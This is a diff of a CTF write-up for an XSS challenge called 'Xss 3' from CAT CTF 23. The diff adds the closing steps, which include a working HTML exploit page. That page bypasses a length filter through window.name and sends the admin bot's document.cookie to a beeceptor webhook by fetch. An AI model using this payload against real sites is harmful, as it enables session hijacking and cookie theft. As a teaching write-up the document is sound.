@@ -1,4 +1,4 @@
-![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/16904042-148f-476b-b60a-582f5d3d04d4)### Hello everyone, this is my writeup for my web challenge " Xss 3 " that had no solves in CAT CTF 23 
+### Hello everyone, this is my writeup for my web challenge " Xss 3 " that had no solves in CAT CTF 23 
 
 ![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/639ccff8-e4fb-40c3-a5ce-dbeec301f48b)
 
@@ -119,9 +119,35 @@
 <iframe src=javascript:alert()>
 ```
 
-### So, let's exploit this is our local to get alert : )
+### So, let's exploit this in our side to get alert : )
 
 ![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/fefb4571-539f-4c1b-9d67-fb0158bba780)
 
-### شب
-### شب
+### After bypassing the limit we can use this code to get the admin cookies !
+
+```
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <Script>window.open('http://127.0.0.1/xss3/?name=\\74iframe/onload=src=top.name\\76','javascript:fetch(\'https://dummmmmmmyyyyy.free.beeceptor.com/?c=\'+document.cookie)')</Script>
+<p id="a"></p>
+<script>a.innerHTML="b";</script>
+</body>
+</html>
+
+```
+
+### Just host it in any web hook like beeceptor and send it to the bot like this
+![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/67634f37-645f-49e5-8080-67b8efa61caa)
+
+### And we got the flag : )
+
+![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/d5333978-0e2a-4a2d-bb3b-08c7ab0cb507)
+
+
+# Thanks for Reading and hope u enjoyed and learned from  it !
